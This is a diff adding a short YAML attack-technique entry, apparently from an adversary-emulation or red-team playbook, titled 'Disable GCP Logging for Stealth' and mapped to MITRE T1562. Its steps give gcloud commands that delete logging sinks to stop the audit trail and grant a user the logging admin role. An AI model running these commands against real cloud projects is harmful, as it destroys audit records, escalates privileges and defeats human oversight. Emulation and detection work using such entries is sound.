@@ -1,0 +1,12 @@
+name: Disable GCP Logging for Stealth
+description: Turns off audit logs and activity tracking for stealthy operations.
+mitre_technique: T1562
+stage: Defense Evasion
+steps:
+- action: gcloud logging sinks list
+  description: Enumerate existing logging sinks
+- action: gcloud logging sinks delete <sink-name>
+  description: Delete log sinks to stop audit trail
+- action: gcloud projects update-iam-policy-binding <project-id> --member='user:<email>'
+    --role='roles/logging.admin'
+  description: Ensure continued access for log manipulation
